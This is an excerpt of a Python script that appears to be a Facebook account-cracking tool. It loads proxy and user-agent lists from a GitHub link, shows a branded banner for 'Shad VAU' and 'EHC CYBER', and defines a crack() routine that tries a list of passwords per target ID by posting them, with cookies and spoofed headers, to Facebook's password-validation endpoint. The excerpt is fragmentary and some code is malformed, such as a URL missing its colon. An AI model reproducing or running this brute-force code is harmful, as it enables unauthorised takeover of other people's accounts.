...
princp=[]
try:
    prox= requests.get('https://github.com/MAHMUD-Shad -404/PRO-MAX/blob/main/Prox.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/MAHMUD-Shad -404/PRO-MAX/blob/main/Prox.txt').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/Shad .CYBER.143.MYMENSINGH.ER.KING')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
logo =""" 
 ...
 \033[1;93m║\033[1;96m[✓] develop BY\33[0;m   : \033[1;96m Shad VAU               \033[1;32m║
 \033[1;93m║\x1b[38;5;208m[✓] \x1b[38;5;208mFACEBOK      : \x1b[38;5;208m Shad VAU               \033[1;32m║
 \033[1;93m║\033[1;35m[✓] GITHUB       :  \033[1;35mAmi-Akhon-dimu.na        \033[1;32m ║
 \033[1;93m║\033[1;38m[✓] TOOL STATUS  : \033[1;38m RANDOM \033[1;32m                   ║
 \033[1;93m║\033[1;32m[✓] TEAM         :\033[1;32    EHC CYBER \033[1;32m                ║
 ...
 \033[1;93m║[\033[1;97m•\033[1;91m]\033[1;32m REQUEST MY FB ID Shad VAU....         \033[1;32m ║
 \033[1;93m╚═════════════════[\033[1;93m IBR4H1M - 404 \033[1;32m]════════════╝"""
os.system('clear')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  Shad,   Tools"')
pass
...
def crack(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('http//m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
